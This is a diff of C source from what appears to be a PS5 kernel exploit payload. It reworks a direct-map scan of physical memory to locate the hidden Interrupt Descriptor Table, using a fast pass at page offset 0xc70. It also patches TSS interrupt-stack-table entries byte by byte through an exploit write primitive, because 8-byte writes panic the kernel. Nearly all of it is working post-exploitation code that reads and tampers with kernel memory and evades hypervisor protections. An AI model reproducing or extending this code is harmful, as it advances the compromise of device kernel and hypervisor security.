@@ -4492,68 +4492,141 @@ broad_done:
                               ridt_candidates_rejected,
                               ridt_probed);
 
-                /* Brute-force: scan physical memory 0..4GB via DMAP
-                 * looking for IDT gate patterns at any 16-byte offset.
-                 * The IDT must exist in physical RAM; even if the HV
-                 * hides it from the kernel's VA space, DMAP may still
-                 * map those physical pages.  The IDT PA varies per boot
-                 * due to KASLR (observed at ~448MB on one run). */
-                uint64_t phys_scan_end = 0x40000000ULL; /* 1GB — IDT observed at PA 250-550MB */
+                /* Brute-force: scan physical memory via DMAP looking for
+                 * IDT gate patterns.  Two-pass approach to minimize
+                 * kernel interactions (each kernel_copyout uses the
+                 * exploit primitive, and too many calls destabilize
+                 * the kernel on PS5).
+                 *
+                 * Fast pass: The IDT has been observed at page offset
+                 * +0xc70 in every PS5 boot.  Read just 64 bytes from
+                 * that offset in each page — this is ~64x less data
+                 * per call and avoids the full 4KB copyout.
+                 *
+                 * Slow pass: Fall back to full-page scan if fast pass
+                 * misses (in case KASLR changes the page offset). */
+                uint64_t phys_scan_end = 0x40000000ULL; /* 1GB */
                 int phys_pages_read = 0;
                 int phys_pages_fail = 0;
+
+                /* Fast pass: check only offset 0xc70 in each page */
+                send_response(sock, "  Fast scan (offset 0xc70)...\n");
                 for (uint64_t pa = 0;
                      pa < phys_scan_end && !idt_found;
                      pa += 4096) {
-                    if ((pa & 0x3FFFFFF) == 0)
+                    if ((pa & 0x3FFFFFF) == 0 && pa != 0)
                         send_response(sock, "  ...PA %luMB/%luMB\n",
                             (unsigned long)(pa >> 20),
                             (unsigned long)(phys_scan_end >> 20));
-                    if (kernel_copyout(dmap_base + pa,
-                                       page, 4096) != 0) {
+                    uint8_t gates[64];
+                    if (kernel_copyout(dmap_base + pa + 0xc70,
+                                       gates, 64) != 0) {
                         phys_pages_fail++;
                         continue;
                     }
                     phys_pages_read++;
 
-                    for (int poff = 0;
-                         poff + 64 <= 4096 && !idt_found;
-                         poff += 16) {
-                        int valid = 0;
-                        for (int v = 0; v < 4; v++) {
-                            uint8_t *g = page + poff + v * 16;
-                            if (!(g[5] & 0x80))
-                                continue;
-                            uint8_t type = g[5] & 0x0F;
-                            if (type != 14 && type != 15)
-                                continue;
-                            uint32_t rsvd;
-                            memcpy(&rsvd, g + 12, 4);
-                            if (rsvd != 0)
-                                continue;
-                            uint64_t h = (uint64_t)g[0] |
-                                ((uint64_t)g[1] << 8) |
-                                ((uint64_t)g[6] << 16) |
-                                ((uint64_t)g[7] << 24) |
-                                ((uint64_t)g[8] << 32) |
-                                ((uint64_t)g[9] << 40) |
-                                ((uint64_t)g[10] << 48) |
-                                ((uint64_t)g[11] << 56);
-                            if (h >= 0xFFFF800000000000ULL)
-                                valid++;
+                    int valid = 0;
+                    for (int v = 0; v < 4; v++) {
+                        uint8_t *g = gates + v * 16;
+                        if (!(g[5] & 0x80))
+                            continue;
+                        uint8_t type = g[5] & 0x0F;
+                        if (type != 14 && type != 15)
+                            continue;
+                        uint32_t rsvd;
+                        memcpy(&rsvd, g + 12, 4);
+                        if (rsvd != 0)
+                            continue;
+                        uint64_t h = (uint64_t)g[0] |
+                            ((uint64_t)g[1] << 8) |
+                            ((uint64_t)g[6] << 16) |
+                            ((uint64_t)g[7] << 24) |
+                            ((uint64_t)g[8] << 32) |
+                            ((uint64_t)g[9] << 40) |
+                            ((uint64_t)g[10] << 48) |
+                            ((uint64_t)g[11] << 56);
+                        if (h >= 0xFFFF800000000000ULL)
+                            valid++;
+                    }
+                    if (valid >= 3) {
+                        idt_found = 1;
+                        idt_base = dmap_base + pa + 0xc70;
+                        idt_access = idt_base;
+                        uint16_t sel;
+                        memcpy(&sel, gates + 2, 2);
+                        send_response(sock,
+                            "  IDT found at PA 0x%lx+0xc70 "
+                            "(%d/4 valid, CS=0x%04x) "
+                            "[%d pages read, %d failed]\n",
+                            pa, valid, sel,
+                            phys_pages_read,
+                            phys_pages_fail);
+                    }
+                }
+
+                /* Slow pass: full-page scan if fast pass missed */
+                if (!idt_found) {
+                    send_response(sock,
+                        "  Fast scan miss (%d read, %d fail); "
+                        "full-page scan...\n",
+                        phys_pages_read, phys_pages_fail);
+                    phys_pages_read = 0;
+                    phys_pages_fail = 0;
+                    for (uint64_t pa = 0;
+                         pa < phys_scan_end && !idt_found;
+                         pa += 4096) {
+                        if ((pa & 0x3FFFFFF) == 0)
+                            send_response(sock, "  ...PA %luMB/%luMB\n",
+                                (unsigned long)(pa >> 20),
+                                (unsigned long)(phys_scan_end >> 20));
+                        if (kernel_copyout(dmap_base + pa,
+                                           page, 4096) != 0) {
+                            phys_pages_fail++;
+                            continue;
                         }
-                        if (valid >= 3) {
-                            idt_found = 1;
-                            idt_base = dmap_base + pa + poff;
-                            idt_access = idt_base; /* via DMAP */
-                            uint16_t sel;
-                            memcpy(&sel, page + poff + 2, 2);
-                            send_response(sock,
-                                "  IDT found at PA 0x%lx+0x%x "
-                                "(%d/4 valid, CS=0x%04x) "
-                                "[%d pages read, %d failed]\n",
-                                pa, poff, valid, sel,
-                                phys_pages_read,
-                                phys_pages_fail);
+                        phys_pages_read++;
+
+                        for (int poff = 0;
+                             poff + 64 <= 4096 && !idt_found;
+                             poff += 16) {
+                            int valid = 0;
+                            for (int v = 0; v < 4; v++) {
+                                uint8_t *g = page + poff + v * 16;
+                                if (!(g[5] & 0x80))
+                                    continue;
+                                uint8_t type = g[5] & 0x0F;
+                                if (type != 14 && type != 15)
+                                    continue;
+                                uint32_t rsvd;
+                                memcpy(&rsvd, g + 12, 4);
+                                if (rsvd != 0)
+                                    continue;
+                                uint64_t h = (uint64_t)g[0] |
+                                    ((uint64_t)g[1] << 8) |
+                                    ((uint64_t)g[6] << 16) |
+                                    ((uint64_t)g[7] << 24) |
+                                    ((uint64_t)g[8] << 32) |
+                                    ((uint64_t)g[9] << 40) |
+                                    ((uint64_t)g[10] << 48) |
+                                    ((uint64_t)g[11] << 56);
+                                if (h >= 0xFFFF800000000000ULL)
+                                    valid++;
+                            }
+                            if (valid >= 3) {
+                                idt_found = 1;
+                                idt_base = dmap_base + pa + poff;
+                                idt_access = idt_base;
+                                uint16_t sel;
+                                memcpy(&sel, page + poff + 2, 2);
+                                send_response(sock,
+                                    "  IDT found at PA 0x%lx+0x%x "
+                                    "(%d/4 valid, CS=0x%04x) "
+                                    "[%d pages read, %d failed]\n",
+                                    pa, poff, valid, sel,
+                                    phys_pages_read,
+                                    phys_pages_fail);
+                            }
                         }
                     }
                 }
@@ -5022,7 +5095,14 @@ broad_done:
         }
 
         /* Step 1: Set TSS IST entries on validated CPUs FIRST — before
-         * touching the IDT. */
+         * touching the IDT.
+         *
+         * Use kernel_setchar (byte-by-byte) instead of kernel_setlong.
+         * kernel_setlong consistently panics the kernel on PS5, possibly
+         * due to the HV trapping 8-byte writes to the TSS or the exploit
+         * primitive's 8-byte write path having side effects after 100k+
+         * prior calls during the DMAP scan.  kernel_setchar uses a
+         * different code path that may avoid the issue. */
         send_response(sock, "\n  Applying TSS patches (%d validated CPUs)...\n",
                       num_cpus_found);
         {
@@ -5030,7 +5110,12 @@ broad_done:
             for (int cpu = 0; cpu < num_cpus_found; cpu++) {
                 uint64_t cpu_tss = tss_va + (uint64_t)cpu * tss_stride;
                 uint64_t ist_off = cpu_tss + 0x24 + idx * 8;
-                kernel_setlong(ist_off, ist_stack_top);
+                /* Write IST value byte-by-byte */
+                uint64_t val = ist_stack_top;
+                for (int b = 0; b < 8; b++) {
+                    kernel_setchar(ist_off + b,
+                                   (uint8_t)(val >> (b * 8)));
+                }
                 ist_modified_percpu[cpu][idx] = 1;
                 send_response(sock, "  CPU%d IST%d -> 0x%lx (at 0x%lx)\n",
                               cpu, gp_ist_index, ist_stack_top, ist_off);
